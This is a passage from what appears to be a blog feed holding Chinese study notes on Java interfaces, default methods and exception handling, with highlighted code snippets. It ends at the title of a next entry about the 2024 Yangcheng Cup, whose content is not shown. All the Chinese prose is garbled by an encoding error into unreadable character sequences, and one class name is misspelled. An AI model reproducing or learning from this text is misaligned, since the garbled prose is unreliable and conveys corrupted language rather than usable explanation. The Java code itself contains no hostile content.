punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‰πüÂèØ‰ª•Áî®<code>instanceof</code>Ê£ÄÊü•‰∏Ä‰∏™ÂØπË±°ÊòØÂê¶ÂÆûÁé∞‰∫ÜÊüê‰∏™ÁâπÂÆöÁöÑÊé•Âè£„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token keyword">instanceof</span> <span class="token class-name">Comparable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>‰∏éÂª∫Á´ãÁ±ªÁöÑÁªßÊâøÂ±ÇÊ¨°‰∏ÄÊ†∑Ôºå‰πüÂèØ‰ª•ÊãìÂ±ïÊé•Âè£„ÄÇ</p><p>ËôΩÁÑ∂Âú®Êé•Âè£‰∏≠‰∏çËÉΩÂåÖÂê´ÂÆû‰æãÂ≠óÊÆµÔºå‰ΩÜÊòØÂèØ‰ª•ÂåÖÂê´Â∏∏Èáè„ÄÇ </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Moveable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">,</span> <span class="token keyword">double</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> <span class="token constant">SPEED_LIMIT</span><span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>‰∏éÊé•Âè£‰∏≠ÁöÑÊñπÊ≥ïÈÉΩËá™Âä®Ë¢´ËÆæÁΩÆ‰∏∫<code>public</code>‰∏ÄÊ†∑ÔºåÊé•Âè£‰∏≠ÁöÑÂ≠óÊÆµÊÄªÊòØ<code>public static final</code>„ÄÇ</p><p>Â∞ΩÁÆ°ÊØè‰∏™Á±ªÂè™ËÉΩÊúâ‰∏Ä‰∏™Ë∂ÖÁ±ªÔºå‰ΩÜÂç¥ÂèØ‰ª•ÂÆûÁé∞Â§ö‰∏™Êé•Âè£„ÄÇÂèØ‰ª•‰ΩøÁî®ÈÄóÂè∑Â∞ÜÊÉ≥Ë¶ÅÂÆûÁé∞ÁöÑÂêÑ‰∏™Êé•Âè£ÂàÜÈöîÂºÄ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span><span class="token punctuation">,</span> <span class="token class-name">Comparable</span></code></pre><p>ÂÆûÈôÖ‰∏äÔºåÊé•Âè£ÂèØ‰ª•Êèê‰æõÂ§öÈáçÁªßÊâøÁöÑÂ§ßÂ§öÊï∞Â•ΩÂ§ÑÔºåÂêåÊó∂ËøòËÉΩÈÅøÂÖçÂ§öÈáçÁªßÊâøÁöÑÂ§çÊùÇÊÄßÂíå‰ΩéÊïàÊÄß„ÄÇ</p><h4 id="ÈªòËÆ§ÊñπÊ≥ï"><a href="#ÈªòËÆ§ÊñπÊ≥ï" class="headerlink" title="ÈªòËÆ§ÊñπÊ≥ï"></a>ÈªòËÆ§ÊñπÊ≥ï</h4><p>ÂèØ‰ª•‰∏∫Êé•Âè£Êèê‰æõ‰∏Ä‰∏™ÈªòËÆ§ÂÆûÁé∞„ÄÇÂøÖÈ°ªÁî®<code>default</code>‰øÆÈ•∞Á¨¶Ê†áËÆ∞ËøôÊ†∑‰∏Ä‰∏™ÊñπÊ≥ï„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">default</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">T</span> other<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÈªòËÆ§ÊñπÊ≥ïÂèØ‰ª•Ë∞ÉÁî®ÂÖ∂‰ªñÊñπÊ≥ï„ÄÇ</p><h4 id="Ëß£ÂÜ≥ÈªòËÆ§ÊñπÊ≥ïÂÜ≤Á™Å"><a href="#Ëß£ÂÜ≥ÈªòËÆ§ÊñπÊ≥ïÂÜ≤Á™Å" class="headerlink" title="Ëß£ÂÜ≥ÈªòËÆ§ÊñπÊ≥ïÂÜ≤Á™Å"></a>Ëß£ÂÜ≥ÈªòËÆ§ÊñπÊ≥ïÂÜ≤Á™Å</h4><p>Â¶ÇÊûúÂÖàÂú®‰∏Ä‰∏™Êé•Âè£‰∏≠Â∞Ü‰∏Ä‰∏™ÊñπÊ≥ïÂÆö‰πâ‰∏∫ÈªòËÆ§ÊñπÊ≥ïÔºåÁÑ∂ÂêéÂèàÂú®Ë∂ÖÁ±ªÊàñÂè¶‰∏Ä‰∏™Êé•Âè£‰∏≠ÂÆö‰πâÂêåÊ†∑ÁöÑÊñπÊ≥ïÔºå‰ºöÂèëÁîü‰ªÄ‰πàÊÉÖÂÜµÔºü</p><ol><li>Ë∂ÖÁ±ª‰ºòÂÖà„ÄÇÂ¶ÇÊûúË∂ÖÁ±ªÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÊñπÊ≥ïÔºåÂêåÂêçËÄå‰∏îÂÖ∑ÊúâÁõ∏ÂêåÂèÇÊï∞Á±ªÂûãÁöÑÈªòËÆ§ÊñπÊ≥ï‰ºöË¢´ÂøΩÁï•„ÄÇ</li><li>Êé•Âè£ÂÜ≤Á™Å„ÄÇÂ¶ÇÊûú‰∏Ä‰∏™Êé•Âè£Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÈªòËÆ§ÊñπÊ≥ïÔºåÂè¶‰∏Ä‰∏™Êé•Âè£Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÂêåÂêçËÄå‰∏îÂèÇÊï∞Á±ªÂûãÔºà‰∏çÁÆ°ÊòØÂê¶ÊòØÈªòËÆ§ÂèÇÊï∞ÔºâÁõ∏ÂêåÁöÑÊñπÊ≥ïÔºåÂøÖÈ°ªË¶ÜÁõñËøô‰∏™ÊñπÊ≥ïÊù•Ëß£ÂÜ≥ÂÜ≤Á™Å„ÄÇ</li></ol><p>‰∏§‰∏™Êé•Âè£Â¶ÇÊûúÂÜ≤Á™ÅÂπ∂‰∏çÈáçË¶Å„ÄÇÂ¶ÇÊûúËá≥Â∞ëÊúâ‰∏Ä‰∏™Êé•Âè£Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÂÆûÁé∞ÔºåÁºñËØëÂô®Â∞±‰ºöÊä•ÂëäÈîôËØØÔºåÁ®ãÂ∫èÂëòÂ∞±ÂøÖÈ°ªËß£ÂÜ≥Ëøô‰∏™‰∫å‰πâÊÄß„ÄÇ</p><h3 id="ÂºÇÂ∏∏"><a href="#ÂºÇÂ∏∏" class="headerlink" title="ÂºÇÂ∏∏"></a>ÂºÇÂ∏∏</h3><h4 id="Â§ÑÁêÜÈîôËØØ"><a href="#Â§ÑÁêÜÈîôËØØ" class="headerlink" title="Â§ÑÁêÜÈîôËØØ"></a>Â§ÑÁêÜÈîôËØØ</h4><p>ÂºÇÂ∏∏Â§ÑÁêÜÁöÑ‰ªªÂä°Â∞±ÊòØÂ∞ÜÊéßÂà∂ÊùÉ‰ªé‰∫ßÁîüÈîôËØØÁöÑÂú∞ÊñπËΩ¨ÁßªÂà∞ËÉΩÂ§üÂ§ÑÁêÜËøôÁßçÊÉÖÂÜµÁöÑÈîôËØØÂ§ÑÁêÜÂô®„ÄÇ</p><p>Âú®Java‰∏≠ÔºåÂ¶ÇÊûúÊüê‰∏™ÊñπÊ≥ï‰∏çËÉΩÂ§üÈááÁî®Ê≠£Â∏∏ÁöÑÈÄîÂæÑÂÆåÊàêÂÆÉÁöÑ‰ªªÂä°ÔºåÂèØ‰ª•ÈÄöËøáÂè¶Â§ñ‰∏Ä‰∏™Ë∑ØÂæÑÈÄÄÂá∫ÊñπÊ≥ï„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÊñπÊ≥ïÂπ∂‰∏çËøîÂõû‰ªª‰ΩïÂÄºÔºåËÄåÊòØÊäõÂá∫‰∫Ü‰∏Ä‰∏™Â∞ÅË£Ö‰∫ÜÈîôËØØ‰ø°ÊÅØÁöÑÂØπË±°„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËøô‰∏™ÊñπÊ≥ïÂ∞Ü‰ºöÁ´ãÂàªÈÄÄÂá∫ÔºåÂπ∂‰∏çËøîÂõûÊ≠£Â∏∏ÂÄº„ÄÇÊ≠§Â§ñÔºå‰πü‰∏ç‰ºö‰ªéË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÁöÑ‰ª£Á†ÅÁªßÁª≠ÊâßË°åÔºåÂèñËÄå‰ª£‰πãÁöÑÊòØÔºåÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÂºÄÂßãÊêúÁ¥¢ËÉΩÂ§üÂ§ÑÁêÜËøôÁßçÂºÇÂ∏∏Áä∂ÂÜµÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂô®„ÄÇ</p><p>ÂºÇÂ∏∏ÂØπË±°ÈÉΩÊòØÊ¥æÁîü‰∫é<code>Throwable</code>Á±ªÁöÑ‰∏Ä‰∏™Á±ªÂÆû‰æã„ÄÇÂ¶ÇÊûúJava‰∏≠ÂÜÖÁΩÆÁöÑÂºÇÂ∏∏Á±ª‰∏çËÉΩÊª°Ë∂≥ÈúÄÊ±ÇÔºåÁî®Êà∑ËøòÂèØ‰ª•ÂàõÂª∫Ëá™Â∑±ÁöÑÂºÇÂ∏∏Á±ª„ÄÇ</p><p>ÊâÄÊúâÁöÑÂºÇÂ∏∏ÈÉΩÊòØÊúâ<code>Throwable</code>ÁªßÊâøËÄåÊù•Ôºå‰ΩÜÂú®‰∏ã‰∏ÄÂ±ÇÁ´ãÂç≥ÂàÜËß£‰∏∫‰∏§‰∏™ÂàÜÊîØÔºö<code>Error</code>Âíå<code>Exception</code>„ÄÇ</p><p><code>Erroe</code>Á±ªÂ±ÇÊ¨°ÁªìÊûÑÊèèËø∞‰∫ÜJavaËøêË°åÊó∂Á≥ªÁªüÁöÑÂÜÖÈÉ®ÈîôËØØÂíåËµÑÊ∫êËÄóÂ∞ΩÈîôËØØ„ÄÇ</p><p><code>Exception</code>Á±ªÂ±ÇÊ¨°ÁªìÊûÑÂèàÂàÜËß£‰∏∫‰∏§‰∏™ÂàÜÊîØÔºö‰∏Ä‰∏™ÂàÜÊîØÊ¥æÁîü‰∫é<code>RuntimeException</code>ÔºõÂè¶‰∏Ä‰∏™ÂàÜÊîØÂåÖÂê´ÂÖ∂‰ªñÂºÇÂ∏∏„ÄÇ‰∏ÄËà¨ÁöÑËßÑÂàôÊòØÁî±ÁºñÁ®ãÈîôËØØÂØºËá¥ÁöÑÂºÇÂ∏∏Â±û‰∫é<code>RuntimeException</code>ÔºõÂ¶ÇÊûúÁ®ãÂ∫èÊú¨Ë∫´Ê≤°ÊúâÈóÆÈ¢òÔºå‰ΩÜÁî±‰∫éÂÉè<code>I/O</code>ÈîôËØØËøôÁ±ªÈóÆÈ¢òÂØºËá¥ÁöÑÂºÇÂ∏∏Â±û‰∫éÂÖ∂‰ªñÂºÇÂ∏∏Ôºà<code>IOException</code>Ôºâ„ÄÇ</p><p>JavaËØ≠Ë®ÄËßÑËåÉÂ∞ÜÊ¥æÁîü‰∫é<code>Error</code>Á±ªÊàñ<code>RuntimeException</code>Á±ªÁöÑÊâÄÊúâÂºÇÂ∏∏Áß∞‰∏∫ÈùûÊ£ÄÊü•ÂûãÂºÇÂ∏∏ÔºåÊâÄÊúâÂÖ∂‰ªñÁöÑÂºÇÂ∏∏Áß∞‰∏∫Ê£ÄÊü•ÂûãÂºÇÂ∏∏„ÄÇ</p><p>Ë¶ÅÂú®ÊñπÊ≥ïÁöÑÈ¶ñÈÉ®ÊåáÂá∫Ëøô‰∏™ÊñπÊ≥ïÂèØËÉΩÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏ÔºåÊâÄ‰ª•Ë¶Å‰øÆÊîπÊñπÊ≥ïÈ¶ñÈÉ®Ôºå‰ª•ÂèçÊò†Ëøô‰∏™ÊñπÊ≥ïÂèØËÉΩÊäõÂá∫ÁöÑÊ£ÄÊü•ÂûãÂºÇÂ∏∏„ÄÇÂ¶ÇÊûú‰∏Ä‰∏™ÊñπÊ≥ïÊúâÂèØËÉΩÊäõÂá∫Â§ö‰∏™Ê£ÄÊü•ÂûãÂºÇÂ∏∏Á±ªÂûãÔºåÈÇ£‰πàÂ∞±ÂøÖÈ°ªÂú®ÊñπÊ≥ïÁöÑÈ¶ñÈÉ®ÂàóÂá∫ÊâÄÊúâÁöÑÂºÇÂ∏∏Á±ª„ÄÇ</p><ol><li>‰∏çÈúÄË¶ÅÂ£∞ÊòéJavaÁöÑÂÜÖÈÉ®ÈîôËØØÔºåÂç≥‰ªéErrorÁªßÊâøÁöÑÂºÇÂ∏∏„ÄÇ</li><li>‰πü‰∏çÂ∫îËØ•Â£∞Êòé‰ªé<code>RuntimeException</code>ÁªßÊâøÁöÑÈÇ£‰∫õÈùûÊ£ÄÊü•ÂûãÂºÇÂ∏∏„ÄÇ</li></ol><blockquote><p>Â¶ÇÊûúÂú®Â≠êÁ±ª‰∏≠Ë¶ÜÁõñ‰∫ÜË∂ÖÁ±ªÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂ≠êÁ±ªÊñπÊ≥ï‰∏≠Â£∞ÊòéÁöÑÊ£ÄÊü•ÂûãÂºÇÂ∏∏‰∏çËÉΩÊØîË∂ÖÁ±ªÊñπÊ≥ï‰∏≠Â£∞ÊòéÁöÑÂºÇÂ∏∏Êõ¥ÈÄöÁî®ÔºàÂ≠êÁ±ªÊñπÊ≥ïÂèØ‰ª•ÊäõÂá∫Êõ¥ÁâπÂÆöÁöÑÂºÇÂ∏∏ÔºåÊàñËÄÖÊ†πÊú¨‰∏çÊäõÂá∫‰ªª‰ΩïÂºÇÂ∏∏„ÄÇÔºâÂ¶ÇÊûúË∂ÖÁ±ªÊñπÊ≥ïÊ≤°ÊúâÊäõÂá∫‰ªª‰ΩïÊ£ÄÊü•ÂûãÂºÇÂ∏∏ÔºåÂ≠êÁ±ª‰πü‰∏çËÉΩÊäõÂá∫‰ªª‰ΩïÊ£ÄÊü•ÂûãÂºÇÂ∏∏„ÄÇ</p></blockquote><p>Â¶ÇÊûúÁ±ª‰∏≠ÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÂ£∞ÊòéÂÆÉ‰ºöÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏ÔºåËÄåËøô‰∏™ÂºÇÂ∏∏Êó∂Êüê‰∏™ÁâπÂÆöÁ±ªÁöÑÂÆû‰æãÔºåÈÇ£‰πàËøô‰∏™ÊñπÊ≥ïÊäõÂá∫ÁöÑÂºÇÂ∏∏ÂèØËÉΩÂ±û‰∫éËøô‰∏™Á±ªÔºå‰πüÂèØËÉΩÂ±û‰∫éËøô‰∏™Á±ªÁöÑ‰∏Ä‰∏™Â≠êÁ±ª„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">EOFException</span></code></pre><p>ÊäõÂá∫ÂºÇÂ∏∏ÈùûÂ∏∏ÂÆπÊòìÔºö</p><ol><li>ÊâæÂà∞‰∏Ä‰∏™ÂêàÈÄÇÁöÑÂºÇÂ∏∏Á±ª„ÄÇ</li><li>ÂàõÂª∫Ëøô‰∏™Á±ªÁöÑ‰∏Ä‰∏™ÂØπË±°„ÄÇ</li><li>Â∞ÜÂØπË±°ÊäõÂá∫„ÄÇ</li></ol><p>‰∏ÄÊó¶ÊñπÊ≥ïÊäõÂá∫‰∫ÜÂºÇÂ∏∏ÔºåËøô‰∏™ÊñπÊ≥ïÂ∞±‰∏ç‰ºöËøîÂõûÂà∞Ë∞ÉÁî®ËÄÖ„ÄÇ‰πüÂ∞±ÊòØËØ¥Ôºå‰∏çÂøÖÊìçÂøÉÂª∫Á´ã‰∏Ä‰∏™ÈªòËÆ§ÁöÑËøîÂõûÂÄºÊàñÈîôËØØÁ†Å„ÄÇ</p><h4 id="ÂàõÂª∫ÂºÇÂ∏∏Á±ª"><a href="#ÂàõÂª∫ÂºÇÂ∏∏Á±ª" class="headerlink" title="ÂàõÂª∫ÂºÇÂ∏∏Á±ª"></a>ÂàõÂª∫ÂºÇÂ∏∏Á±ª</h4><p>Êàë‰ª¨ÈúÄË¶ÅÂÅöÁöÑÂè™ÊòØÂÆö‰πâ‰∏Ä‰∏™Ê¥æÁîü‰∫é<code>Exception</code>ÁöÑÁ±ªÔºåÊàñËÄÖÊ¥æÁîü‰∫é<code>Exception</code>ÁöÑÊüê‰∏™Â≠êÁ±ªÔºåÂ¶Ç<code>IOException</code>„ÄÇ‰π†ÊÉØÂÅöÊ≥ïÊòØÔºåËá™ÂÆö‰πâÁöÑËøô‰∏™Á±ªÂ∫îËØ•ÂåÖÂê´‰∏§‰∏™ÊûÑÈÄ†Âô®Ôºå‰∏Ä‰∏™ÊòØÈªòËÆ§ÁöÑÊûÑÈÄ†Âô®ÔºåÂè¶‰∏Ä‰∏™ÊòØÂåÖÂê´ËØ¶ÁªÜÊèèËø∞‰ø°ÊÅØÁöÑÊûÑÈÄ†Âô®ÔºàË∂ÖÁ±ª<code>Throwable</code>ÁöÑ<code>toString</code>ÊñπÊ≥ï‰ºöËøîÂõû‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠ÂåÖÂê´Ëøô‰∏™ËØ¶ÁªÜ‰ø°ÊÅØÔºåËøôÂú®Ë∞ÉËØï‰∏≠ÈùûÂ∏∏ÊúâÁî®Ôºâ„ÄÇ</p><h4 id="ÊçïËé∑ÂºÇÂ∏∏"><a href="#ÊçïËé∑ÂºÇÂ∏∏" class="headerlink" title="ÊçïËé∑ÂºÇÂ∏∏"></a>ÊçïËé∑ÂºÇÂ∏∏</h4><p>Ë¶ÅÊÉ≥ÊçïËé∑‰∏Ä‰∏™ÂºÇÂ∏∏ÔºåÈúÄË¶ÅËÆæÁΩÆ<code>try/catch</code>ËØ≠Âè•ÂùóÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Â¶ÇÊûútryËØ≠Âè•Âùó‰∏≠ÁöÑ‰ªª‰Ωï‰ª£Á†ÅÊäõÂá∫‰∫ÜcatchÂ≠êÂè•‰∏≠ÊåáÂÆöÁöÑ‰∏Ä‰∏™ÂºÇÂ∏∏Á±ªÔºåÈÇ£‰πà</p><ol><li>Á®ãÂ∫èÂ∞ÜË∑≥ËøátryËØ≠Âè•ÂùóÁöÑÂÖ∂‰Ωô‰ª£Á†Å„ÄÇ</li><li>Á®ãÂ∫èÂ∞ÜÊâßË°åcatchÂ≠êÂè•‰∏≠ÁöÑÂ§ÑÁêÜÂô®‰ª£Á†Å„ÄÇ</li></ol><p>Â¶ÇÊûú<code>try</code>ËØ≠Âè•Âùó‰∏≠ÁöÑ‰ª£Á†ÅÊ≤°ÊúâÊäõÂá∫‰ªª‰ΩïÂºÇÂ∏∏ÔºåÈÇ£‰πàÁ®ãÂ∫èÂ∞ÜË∑≥Ëøá<code>catch</code>Â≠êÂè•„ÄÇ</p><p>Â¶ÇÊûúÊñπÊ≥ï‰∏≠ÁöÑ‰ªª‰Ωï‰ª£Á†ÅÊäõÂá∫‰∫Ü<code>catch</code>Â≠êÂè•‰∏≠Ê≤°ÊúâÂ£∞ÊòéÁöÑ‰∏Ä‰∏™ÂºÇÂ∏∏Á±ªÂûãÔºåÈÇ£‰πàËøô‰∏™ÊñπÊ≥ïÂ∞±‰ºöÁ´ãÂç≥ÈÄÄÂá∫ÔºàÂ∏åÊúõÂÆÉÁöÑË∞ÉÁî®ËÄÖ‰∏∫ËøôÁßçÁ±ªÂûãÁöÑÂºÇÂ∏∏Êèê‰æõ‰∫Ü<code>catch</code>Â≠êÂè•Ôºâ„ÄÇ</p><p>‰∏ÄËà¨ÁöÑÁªèÈ™åÊòØÔºåË¶ÅÊçïËé∑ÈÇ£‰∫õ‰Ω†Áü•ÈÅìÂ¶Ç‰ΩïÂ§ÑÁêÜÁöÑÂºÇÂ∏∏ÔºåËÄåÁªßÁª≠‰º†Êí≠ÈÇ£‰∫õ‰Ω†‰∏çÁü•ÈÅìÊÄéÊ†∑Â§ÑÁêÜÁöÑÂºÇÂ∏∏„ÄÇ</p><h4 id="ÊçïËé∑Â§ö‰∏™ÂºÇÂ∏∏"><a href="#ÊçïËé∑Â§ö‰∏™ÂºÇÂ∏∏" class="headerlink" title="ÊçïËé∑Â§ö‰∏™ÂºÇÂ∏∏"></a>ÊçïËé∑Â§ö‰∏™ÂºÇÂ∏∏</h4><p>Âú®‰∏Ä‰∏™<code>try</code>ËØ≠Âè•Âùó‰∏≠ÂèØ‰ª•ÊçïËé∑Â§ö‰∏™ÂºÇÂ∏∏Á±ªÂûãÔºåÂπ∂ÂØπ‰∏çÂêåÁ±ªÂûãÁöÑÂºÇÂ∏∏ÂÅöÂá∫‰∏çÂêåÁöÑÂ§ÑÁêÜÔºåË¶Å‰∏∫ÊØè‰∏™ÂºÇÂ∏∏Á±ªÂûã‰ΩøÁî®‰∏Ä‰∏™ÂçïÁã¨ÁöÑ<code>catch</code>Â≠êÂè•„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>ÂºÇÂ∏∏ÂØπË±°ÂèØËÉΩÂåÖÂê´ÊúâÂÖ≥ÂºÇÂ∏∏ÊÄßË¥®ÁöÑ‰ø°ÊÅØ„ÄÇË¶ÅÊÉ≥Ëé∑ÂæóËøô‰∏™ÂØπË±°ÁöÑÊõ¥Â§ö‰ø°ÊÅØÔºåÂèØ‰ª•Â∞ùËØï‰ΩøÁî®<code>e.getMessage()</code>ÂæóÂà∞ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ„ÄÇ</p><h4 id="finallyÂ≠êÂè•"><a href="#finallyÂ≠êÂè•" class="headerlink" title="finallyÂ≠êÂè•"></a><code>finally</code>Â≠êÂè•</h4><p>‰∏çÁÆ°ÊòØÂê¶ÊúâÂºÇÂ∏∏Ë¢´ÊçïËé∑Ôºå<code>finally</code>Â≠êÂè•‰∏≠ÁöÑ‰ª£Á†ÅÈÉΩ‰ºöË¢´ÊâßË°åÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token class-name">FileInputStream</span> in <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span>    <span class="token punctuation">&#123;</span>        in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exception<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">finally</span>    <span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÂÖ∂ÂÆûËøôÈáåÁöÑ<code>finally</code>Â≠êÂè•‰πüÊúâÂèØËÉΩÊäõÂá∫ÂºÇÂ∏∏„ÄÇ</p><blockquote><p><code>finally</code>Â≠êÂè•ÁöÑ‰ΩìË¶ÅÁî®‰∫éÊ∏ÖÁêÜËµÑÊ∫ê„ÄÇ‰∏çË¶ÅÊääÊîπÂèòÊéßÂà∂ÊµÅÁöÑËØ≠Âè•Ôºà<code>return,throw,break,continue</code>ÔºâÊîæÂú®<code>finally</code>Â≠êÂè•‰∏≠„ÄÇ</p></blockquote><h4 id="try-with-ResourcesËØ≠Âè•"><a href="#try-with-ResourcesËØ≠Âè•" class="headerlink" title="try-with-ResourcesËØ≠Âè•"></a><code>try-with-Resources</code>ËØ≠Âè•</h4><p><code>try-with-Resources</code>ËØ≠Âè•ÔºàÂ∏¶ËµÑÊ∫êÁöÑ<code>try</code>ËØ≠Âè•ÔºâÁöÑÊúÄÁÆÄÂΩ¢Âºè‰∏∫Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">Resource</span> res <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    work <span class="token keyword">with</span> <span class="token namespace">res</span><span class="token punctuation">&#125;</span></code></pre><p><code>try</code>ÂùóÈÄÄÂá∫Êó∂Ôºå‰ºöËá™Âä®Ë∞ÉÁî®<code>res.close()</code>„ÄÇ</p><h3 id="‰ΩøÁî®ÂºÇÂ∏∏ÁöÑÊäÄÂ∑ß"><a href="#‰ΩøÁî®ÂºÇÂ∏∏ÁöÑÊäÄÂ∑ß" class="headerlink" title="‰ΩøÁî®ÂºÇÂ∏∏ÁöÑÊäÄÂ∑ß"></a>‰ΩøÁî®ÂºÇÂ∏∏ÁöÑÊäÄÂ∑ß</h3><ol><li>ÂºÇÂ∏∏Â§ÑÁêÜ‰∏çËÉΩ‰ª£ÊõøÁÆÄÂçïÁöÑÊµãËØï„ÄÇ</li><li>‰∏çË¶ÅËøáÂàÜÂú∞ÁªÜÂåñÂºÇÂ∏∏„ÄÇ</li><li>ÂÖÖÂàÜÂà©Áî®ÂºÇÂ∏∏Â±ÇÊ¨°ÁªìÊûÑ„ÄÇ</li><li>‰∏çË¶ÅÂéãÂà∂ÂºÇÂ∏∏„ÄÇ</li><li>Âú®Ê£ÄÊµãÈîôËØØÊó∂Ôºå‚ÄúËãõÂàª‚ÄôË¶ÅÊØîÊîæ‰ªªÊõ¥Â•Ω„ÄÇ</li><li>‰∏çË¶ÅÁæû‰∫é‰º†ÈÄíÂºÇÂ∏∏„ÄÇ</li></ol>]]></content>
      
      
      <categories>
          
          <category> ÊäÄÊúØÁ¨îËÆ∞ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024ÁæäÂüéÊùØ</title>
      <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
